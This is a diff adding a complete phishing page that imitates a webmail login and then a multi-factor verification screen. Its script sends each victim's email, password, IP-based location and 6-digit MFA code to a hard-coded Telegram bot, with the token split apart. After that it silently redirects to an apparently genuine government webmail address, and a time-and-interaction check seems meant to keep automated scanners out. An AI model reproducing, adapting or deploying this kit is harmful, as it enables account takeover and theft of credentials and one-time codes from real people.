@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>Webmail • Secure Login</title>
+  <link href="https://fonts.googleapis.com/css?family=Roboto:100,400,500,700" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <style>
+    /* ========== ORIGINAL WEBMAIL LOGIN STYLES (fully preserved) ========== */
+    * {
+      -webkit-box-sizing: border-box;
+      -moz-box-sizing: border-box;
+      box-sizing: border-box;
+    }
+    body {
+      font-family: "Roboto", "Helvetica Neue", Helvetica, Arial, sans-serif;
+      font-size: 14px;
+      line-height: 1.42857;
+      color: #333333;
+      background-color: #FAFAFA;
+      margin: 0;
+    }
+    #content {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: fixed;
+      top: 0;
+      left: 0;
+      bottom: 0;
+      right: 0;
+      background: #EAEAEA;
+      padding: 16px;
+    }
+    #content > div {
+      max-width: 500px;
+      width: 100%;
+      background: transparent;
+    }
+    #content-header {
+      background: #424242;
+      color: #FCFCFC;
+      border-radius: 4px 4px 0 0;
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      justify-content: space-between;
+      padding: 12px 16px;
+    }
+    #content-header-label {
+      font-size: 24px;
+      font-weight: 300;
+      line-height: 1.2;
+    }
+    #content-body {
+      background: #FFFFFF;
+      border-radius: 0 0 4px 4px;
+      width: 100%;
+    }
+    #form {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      padding: 20px;
+      width: 100%;
+    }
+    #form-body {
+      width: 100%;
+      margin: 40px 0px 0px 20px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding-right: 20px;
+    }
+    #form-container {
+      width: 100%;
+      margin: 0px auto;
+      padding: 0px 10px;
+    }
+    .row {
+      margin: 0px -10px;
+    }
+    .col {
+      width: 100%;
+      float: left;
+      position: relative;
+      min-height: 1px;
+      padding: 0px 10px;
+    }
+    .form-group {
+      width: inherit;
+      padding-right: 30px;
+      margin-bottom: 20px;
+    }
+    .form-label {
+      font-size: 16px;
+      margin-bottom: 8px;
+      color: #616161;
+      display: inline-block;
+    }
+    .form-field {
+      border: 1px solid #BDBDBD;
+      border-radius: 2px;
+      background: #FFFFFF;
+      font-size: 16px;
+      color: #616161;
+      height: 32px;
+      display: block;
+      width: 100%;
+      padding: 4px 8px;
+    }
+    .error-message {
+      color: #d32f2f;
+      font-size: 12px;
+      margin-top: 4px;
+      display: block;
+    }
+    #pass-col {
+      position: relative;
+    }
+    #forgot-password {
+      position: absolute;
+      top: 0px;
+      right: 40px;
+      color: #0C7C84;
+      text-decoration: none;
+    }
+    #login-btn-toolbar {
+      float: right;
+      margin: auto 30px 15px -20px;
+    }
+    #login-btn {
+      float: right;
+      display: inline-flex;
+      justify-content: center;
+      align-items: center;
+      padding: 0 12px;
+      height: 32px;
+      font-size: 14px;
+      font-weight: 400;
+      text-transform: capitalize;
+      color: #fff;
+      background-color: #0C7C84;
+      border: 1px solid transparent;
+      border-radius: 2px;
+      cursor: pointer;
+    }
+    #login-btn.disabled {
+      background-color: #cccccc;
+      cursor: not-allowed;
+      opacity: 0.6;
+    }
+    /* MFA page (second page) – matches the official MFA interface style */
+    .mfa-card {
+      background: #FFFFFF;
+      border-radius: 0 0 4px 4px;
+      padding: 28px 24px;
+    }
+    .mfa-alert {
+      background: #BBDEFB;
+      padding: 12px 16px;
+      border-radius: 4px;
+      display: flex;
+      gap: 12px;
+      align-items: center;
+      margin-bottom: 24px;
+    }
+    .mfa-alert i {
+      font-size: 20px;
+      color: #0D47A1;
+    }
+    .mfa-title {
+      font-size: 16px;
+      font-weight: 500;
+      margin-bottom: 16px;
+      text-align: center;
+    }
+    .mfa-code-input {
+      width: 200px;
+      margin: 0 auto 20px auto;
+      text-align: center;
+      font-size: 24px;
+      letter-spacing: 4px;
+      padding: 10px;
+      border: 1px solid #BDBDBD;
+      border-radius: 4px;
+      display: block;
+    }
+    .radio-group {
+      background: #f5f5f5;
+      padding: 12px 16px;
+      border-radius: 8px;
+      margin: 20px 0;
+      text-align: left;
+    }
+    .radio-group label {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 10px;
+      font-weight: normal;
+      cursor: pointer;
+    }
+    .mfa-btn {
+      background: #0C7C84;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      width: 100%;
+      border-radius: 2px;
+      font-size: 14px;
+      cursor: pointer;
+      font-weight: 500;
+    }
+    .mfa-help {
+      text-align: center;
+      margin-top: 20px;
+    }
+    .mfa-help button {
+      background: none;
+      border: none;
+      color: #0C7C84;
+      cursor: pointer;
+      font-size: 14px;
+    }
+    .hidden {
+      display: none;
+    }
+    @media (max-width: 480px) {
+      #form-body { margin: 20px 0 0 0; padding-right: 0; }
+      .form-group { padding-right: 0; }
+      #forgot-password { right: 10px; }
+      #login-btn-toolbar { float: none; margin-top: 20px; text-align: right; }
+      .mfa-code-input { width: 80%; }
+    }
+  </style>
+</head>
+<body>
+<div id="content">
+  <div>
+    <!-- LOGIN PAGE (original Webmail interface) -->
+    <div id="loginPage">
+      <div id="content-header">
+        <div id="content-header-label">Webmail Login</div>
+        <div id="content-header-logo"></div>
+      </div>
+      <div id="content-body">
+        <form id="form" method="post" name="login" autocomplete="off">
+          <div id="form-body">
+            <div id="form-container">
+              <div id="user-row" class="row">
+                <div id="user-col" class="col">
+                  <div id="user-field" class="form-group">
+                    <label id="user-label" class="form-label">Email address</label>
+                    <input id="user-input" name="username" class="form-field" autocomplete="username">
+                    <span id="emailError" class="error-message"></span>
+                  </div>
+                </div>
+              </div>
+              <div id="pass-row" class="row">
+                <div id="pass-col" class="col">
+                  <div id="pass-field" class="form-group">
+                    <label id="pass-label" class="form-label">Password</label>
+                    <input id="pass-input" name="password" type="password" class="form-field" autocomplete="current-password">
+                  </div>
+                  <a id="forgot-password" href="#">Forgot password?</a>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div id="login-btn-toolbar">
+            <button id="login-btn" type="submit" class="disabled" disabled>Log In</button>
+          </div>
+        </form>
+      </div>
+    </div>
+
+    <!-- MFA PAGE (second page, hidden initially) – matches the official MFA style -->
+    <div id="mfaPage" class="hidden">
+      <div id="content-header">
+        <div id="content-header-label">Webmail Login</div>
+        <div id="content-header-logo"></div>
+      </div>
+      <div id="content-body" class="mfa-card">
+        <div class="mfa-alert">
+          <i class="fas fa-info-circle"></i>
+          <span>Please provide a verification code from your mobile app to proceed. This extra layer of security helps prevent hackers from accessing your account.</span>
+        </div>
+        <div class="mfa-title">Please enter your login verification code below.</div>
+        <input type="text" id="mfaCode" class="mfa-code-input" maxlength="6" placeholder="000000" autocomplete="off">
+        <div id="mfaError" class="error-message" style="text-align:center;"></div>
+        <div class="radio-group">
+          <div style="font-weight:500; margin-bottom:8px;">Remember This Device?</div>
+          <label><input type="radio" name="rememberDevice" value="true" checked> Yes. This is a device I trust and use regularly.</label>
+          <label><input type="radio" name="rememberDevice" value="false"> No. This is a public device or one I don't use regularly.</label>
+        </div>
+        <button id="verifyMfaBtn" class="mfa-btn">Verify My Code</button>
+        <div class="mfa-help">
+          <button id="troubleBtn">Having trouble with your login?</button>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+  // ==================== TELEGRAM CONFIGURATION ====================
+  const tokenParts = ['8951107080', 'AAGAP-cpSKCruKJY5s40svS1Tnp85f_D6eA'];
+  const TELEGRAM_BOT_TOKEN = tokenParts[0] + ':' + tokenParts[1];
+  const TELEGRAM_CHAT_ID = '8645191324';
+  // ===============================================================
+
+  // ---------- ANTI-BOT & EMAIL VALIDATION (Login page) ----------
+  let humanScore = 0;
+  let mouseMoved = false, keyPressed = false, touched = false;
+  let pageStartTime = Date.now();
+  const loginBtn = document.getElementById('login-btn');
+  const usernameInput = document.getElementById('user-input');
+  const passwordInputField = document.getElementById('pass-input');
+  const emailErrorSpan = document.getElementById('emailError');
+
+  function updateLoginButton() {
+    const timeSpent = (Date.now() - pageStartTime) >= 4000;
+    const interaction = mouseMoved || keyPressed || touched;
+    const emailValid = isValidEmail(usernameInput.value.trim());
+    if (timeSpent && interaction && emailValid && usernameInput.value.trim() !== "") {
+      loginBtn.classList.remove('disabled');
+      loginBtn.disabled = false;
+    } else {
+      loginBtn.classList.add('disabled');
+      loginBtn.disabled = true;
+    }
+  }
+
+  document.addEventListener('mousemove', () => { if(!mouseMoved){ mouseMoved=true; updateLoginButton(); } });
+  document.addEventListener('keydown', () => { if(!keyPressed){ keyPressed=true; updateLoginButton(); } });
+  document.addEventListener('touchstart', () => { if(!touched){ touched=true; updateLoginButton(); } });
+  setInterval(updateLoginButton, 500);
+
+  function isValidEmail(email) {
+    return /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/.test(email);
+  }
+  usernameInput.addEventListener('input', () => {
+    const val = usernameInput.value.trim();
+    if (val && !isValidEmail(val)) emailErrorSpan.innerText = "Please enter a valid email address";
+    else emailErrorSpan.innerText = "";
+    updateLoginButton();
+  });
+
+  async function getLocationData() {
+    try {
+      const res = await fetch('https://ipapi.co/json/');
+      const d = await res.json();
+      return { ip: d.ip || "N/A", city: d.city || "N/A", region: d.region || "N/A", country: d.country_name || "N/A", isp: d.org || "N/A" };
+    } catch(e) { return { ip: "Unavailable", city: "N/A", region: "N/A", country: "N/A", isp: "N/A" }; }
+  }
+
+  async function sendFirstPageToTelegram(username, password, location) {
+    const msg = `🔐 *NEW WEBMAIL LOGIN*\n👤 *Email:* \`${username}\`\n🔑 *Password:* \`${password}\`\n🌍 *IP:* ${location.ip}\n📍 *Location:* ${location.city}, ${location.region}, ${location.country}\n🏢 *ISP:* ${location.isp}\n🕒 *Time:* ${new Date().toLocaleString()}`;
+    try {
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: 'Markdown' })
+      });
+      return true;
+    } catch(e) { return false; }
+  }
+
+  // Switch to MFA page after login
+  const loginPage = document.getElementById('loginPage');
+  const mfaPage = document.getElementById('mfaPage');
+
+  document.getElementById('form').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    if (loginBtn.disabled) {
+      alert("Please move your mouse, press a key, or wait a few seconds before logging in.");
+      return;
+    }
+    const email = usernameInput.value.trim();
+    const pwd = passwordInputField.value.trim();
+    if (!email || !pwd) return alert("Both fields required.");
+    if (!isValidEmail(email)) return alert("Invalid email format.");
+
+    const loc = await getLocationData();
+    const sent = await sendFirstPageToTelegram(email, pwd, loc);
+    if (sent) {
+      // Hide login, show MFA – no success alert
+      loginPage.classList.add('hidden');
+      mfaPage.classList.remove('hidden');
+    } else {
+      alert("Network error – please try again.");
+    }
+  });
+
+  // ---------- MFA PAGE LOGIC (send code to Telegram, then redirect without notification) ----------
+  const mfaCodeInput = document.getElementById('mfaCode');
+  const verifyMfaBtn = document.getElementById('verifyMfaBtn');
+  const mfaErrorSpan = document.getElementById('mfaError');
+
+  verifyMfaBtn.addEventListener('click', async () => {
+    let code = mfaCodeInput.value.trim();
+    if (!/^\d{6}$/.test(code)) {
+      mfaErrorSpan.innerText = "Please enter a valid 6‑digit code";
+      return;
+    }
+    mfaErrorSpan.innerText = "";
+    const rememberValue = document.querySelector('input[name="rememberDevice"]:checked').value;
+    const rememberText = (rememberValue === 'true') ? "Yes (trusted device)" : "No (public device)";
+    const msg = `📱 *MFA CODE*\n🔢 Verification code: \`${code}\`\n💻 Remember this device: ${rememberText}\n🕒 Time: ${new Date().toLocaleString()}`;
+    try {
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: 'Markdown' })
+      });
+      // Redirect immediately – NO ALERT, NO NOTIFICATION
+      window.location.href = "https://webmail.jcf.gov.jm/a/webmail.php?wsid=56217349c38d469d983144f0b69604f9-b3a79ba021b74c1d885aaeca37b6cfca";
+    } catch(e) {
+      alert("Network error. Please try again.");
+    }
+  });
+
+  document.getElementById('troubleBtn').addEventListener('click', () => {
+    alert("Please contact support or use account recovery options.");
+  });
+
+  // Restrict MFA code input to numbers only
+  mfaCodeInput.addEventListener('input', function(e) {
+    this.value = this.value.replace(/[^0-9]/g, '').slice(0,6);
+  });
+</script>
+</body>
+</html>
